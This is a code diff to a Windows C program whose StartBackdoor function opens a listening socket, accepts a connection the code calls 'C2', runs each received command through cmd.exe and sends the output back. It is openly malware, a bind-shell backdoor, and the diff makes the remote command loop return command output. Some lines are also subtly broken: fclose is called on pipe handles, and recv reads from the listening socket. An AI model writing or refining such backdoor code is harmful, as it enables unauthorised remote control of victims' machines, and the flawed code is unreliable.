@@ -1,7 +1,8 @@
 #include "../include/config.h"
+#include <conio.h>
 
 BOOL StartBackdoor(void) {
-    SOCKET s = INVALID_SOCKET;  // Initialize s to INVALID_SOCKET
+    SOCKET s = INVALID_SOCKET;
     struct sockaddr_in address = {0};
     int opt = 1;
 
@@ -19,7 +20,6 @@ BOOL StartBackdoor(void) {
     printf("[DEBUG] Socket created: %lu\n", (unsigned long)s);
     fflush(stdout);
 
-    // 2. Set socket options
     if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(int)) != 0) {
         printf("[DEBUG] setsockopt failed: %lu\n", (unsigned long)GetLastError());
     }
@@ -36,7 +36,7 @@ BOOL StartBackdoor(void) {
         address.sin_addr.s_addr = inet_addr(BACKDOOR_HOST);
     }
 
-    // 3. Bind socket
+    // 2. Bind socket
     if (bind(s, (struct sockaddr*)&address, sizeof(address)) != SOCKET_ERROR) {
         printf("[DEBUG] bind() succeeded\n");
         fflush(stdout);
@@ -45,12 +45,11 @@ BOOL StartBackdoor(void) {
         fflush(stdout);
     }
 
-    // 4. Listen on socket
+    // 3. Listen on socket
     if (listen(s, SOCKET_BACKLOG) != SOCKET_ERROR) {
         printf("[DEBUG] listen() succeeded\n");
         fflush(stdout);
         
-        // Show we're listening
         char hostip[16];
         inet_ntop(AF_INET, &address.sin_addr, hostip, sizeof(hostip) - 1);
         printf("[BACKDOOR] Listener ready on %s:%d\n", hostip, BACKDOOR_PORT);
@@ -60,106 +59,100 @@ BOOL StartBackdoor(void) {
 
         // Accept connection
         SOCKET client = INVALID_SOCKET;
-        if (client == INVALID_SOCKET) {
-            printf("[DEBUG] accept() failed: %lu\n", (unsigned long)client);
-            fflush(stdout);
-        }
-
         client = accept(s, NULL, NULL);
         if (client != INVALID_SOCKET) {
             printf("[BACKDOOR] C2 Connected! Executing reverse shell...\n");
             fflush(stdout);
 
-            // Spawn SYSTEM CMD.EXE for reverse shell (using wchar_t* consistently)
-            wchar_t *cmdLine = NULL;
-            
-            // Create wide string command
-            cmdLine = (wchar_t*)malloc(512 * sizeof(wchar_t));
-            if (cmdLine) {
-                swprintf(cmdLine, 512, L"cmd.exe /c start \"SystemShell\" cmd.exe /c whoami");
+            // Create pipe for capturing output
+            HANDLE hReadPipe = NULL, hWritePipe = NULL;
+            if (!CreatePipe(&hReadPipe, &hWritePipe, NULL, 0)) {
+                printf("[DEBUG] CreatePipe failed: %lu\n", (unsigned long)GetLastError());
+                fclose(hReadPipe);
+                fclose(hWritePipe);
             }
 
-            STARTUPINFOW_CUSTOM si = { 0 };
-            PROCESS_INFORMATION pi = { 0 };
+            // Initialize standard STARTUPINFOW with pipe handles
+            STARTUPINFOW si = { 0 };
+            si.cb = sizeof(STARTUPINFOW);
+            si.dwFlags = STARTF_USESTDHANDLES;
+            si.hStdOutput = hWritePipe;
+            si.hStdError = hWritePipe;
+            si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+
+            // Spawn cmd.exe with the received command
+            char *cmd = NULL;
+            int cmdLen = 0;
             
-            si.dwSize = sizeof(STARTUPINFOW_CUSTOM);
-            si.dwXStartInfo = 0x12345678;
-
-            // Use wide strings for CreateProcessW
-            if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, 
-                               CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
-                               NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
-                printf("[BACKDOOR] SYSTEM Shell spawned! PID=%lu\n", pi.dwProcessId);
-                fflush(stdout);
-                Sleep(5000);
-                CloseHandle(pi.hThread);
-            } else {
-                printf("[BACKDOOR] Shell spawn failed: %lu\n", (unsigned long)GetLastError());
-                fflush(stdout);
-            }
-
-            if (cmdLine) {
-                free(cmdLine);
-            }
-
-            // Keep listening for commands
-            printf("[BACKDOOR] Listening for C2 commands...\n");
-            fflush(stdout);
-            
-            while (TRUE) {
-                // Use char* for recv() (single-byte string)
-                char *buffer = (char*)malloc(1024 * sizeof(char));
-                if (buffer) {
-                    int bytes = recv(client, buffer, 1024, 0);
+            if (client != INVALID_SOCKET) {
+                // Allocate a buffer for command
+                cmd = (char*)malloc(1024 * sizeof(char));
+                if (cmd) {
+                    // Read command from client (assume null-terminated string for simplicity)
+                    int bytes = recv(s, cmd, 1023, 0);
                     if (bytes > 0) {
-                        buffer[bytes] = 0;
-                        printf("[BACKDOOR] Received: %s\n", buffer);
-                        fflush(stdout);
+                        cmd[bytes] = 0;
+                        printf("[BACKDOOR] Received Command: %s\n", cmd);
                         
-                        // Convert char* to wchar_t* for CreateProcessW
-                        wchar_t *wcharBuffer = (wchar_t*)malloc(1024 * sizeof(wchar_t));
-                        if (wcharBuffer) {
-                            swprintf(wcharBuffer, 1024, L"%s", buffer);
+                        // Spawn cmd.exe /c <command>
+                        wchar_t *cmdWide = (wchar_t*)malloc(2048 * sizeof(wchar_t));
+                        if (cmdWide) {
+                            swprintf(cmdWide, 2048, L"cmd.exe /c \"%s\"", cmd);
                             
-                            // Spawn SYSTEM CMD.EXE for each command (wide string)
-                            wchar_t *cmdLine2 = (wchar_t*)malloc(2048 * sizeof(wchar_t));
-                            if (cmdLine2 && wcharBuffer[0]) {
-                                swprintf(cmdLine2, 2048, L"cmd.exe /c %ls", wcharBuffer);
+                            // CreateProcessW with pipe handles
+                            PROCESS_INFORMATION pi = { 0 };
+                            if (CreateProcessW(NULL, cmdWide, NULL, NULL, TRUE, // bInheritHandles = TRUE
+                                               CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
+                                               NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
+                                printf("[BACKDOOR] Shell spawned! PID=%lu\n", pi.dwProcessId);
+                                fflush(stdout);
                                 
-                                STARTUPINFOW_CUSTOM si2 = { 0 };
-                                PROCESS_INFORMATION pi2 = { 0 };
-                                si2.dwSize = sizeof(STARTUPINFOW_CUSTOM);
-                                si2.dwXStartInfo = 0x12345679;
+                                // Cleanup pipe handle
+                                fclose(hWritePipe);
                                 
-                                if (CreateProcessW(NULL, cmdLine2, NULL, NULL, FALSE, 
-                                                  CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
-                                                  NULL, NULL, (LPSTARTUPINFOW)&si2, &pi2)) {
-                                    printf("[BACKDOOR] Command executed: PID=%lu\n", pi2.dwProcessId);
-                                    fflush(stdout);
-                                    Sleep(2000);
-                                    CloseHandle(pi2.hThread);
-                                } else {
-                                    printf("[BACKDOOR] Command failed: %lu\n", (unsigned long)GetLastError());
-                                    fflush(stdout);
+                                // Read output from pipe
+                                char buffer[1024] = {0};
+                                char temp[1024] = {0};
+                                BOOL stillRunning = TRUE;
+                                
+                                while (stillRunning) {
+                                    DWORD bytesRead = 0;
+                                    ReadFile(hReadPipe, temp, sizeof(temp) - 1, &bytesRead, NULL);
+                                    temp[bytesRead] = 0;
+                                    
+                                    if (bytesRead > 0) {
+                                        // Send output to client
+                                        send(client, temp, bytesRead, 0);
+                                        printf("[BACKDOOR] Received Output: %s\n", temp);
+                                        fflush(stdout);
+                                        
+                                        if (temp[0] == 0) { // EOF check
+                                            stillRunning = FALSE;
+                                            printf("[BACKDOOR] Shell exited\n");
+                                            fflush(stdout);
+                                        }
+                                    } else {
+                                        stillRunning = FALSE;
+                                    }
                                 }
-                                free(cmdLine2);
+                                
+                                // Cleanup
+                                CloseHandle(hReadPipe);
+                                CloseHandle(hWritePipe);
+                                CloseHandle(pi.hThread);
+                                CloseHandle(pi.hProcess);
+                                free(cmdWide);
+                                free(cmd);
+                            } else {
+                                printf("[BACKDOOR] Shell spawn failed: %lu\n", (unsigned long)GetLastError());
+                                fflush(stdout);
                             }
-                            free(wcharBuffer);
                         }
-                        free(buffer);
-                    } else if (bytes == 0) {
-                        printf("[BACKDOOR] C2 Disconnected.\n");
-                        fflush(stdout);
-                        break;
                     } else {
-                        printf("[BACKDOOR] Receive error: %lu\n", (unsigned long)GetLastError());
+                        printf("[BACKDOOR] Read command failed: %lu\n", (unsigned long)GetLastError());
                         fflush(stdout);
-                        break;
+                        free(cmd);
                     }
-                } else {
-                    printf("[BACKDOOR] Buffer allocation failed\n");
-                    fflush(stdout);
-                    break;
                 }
             }
 
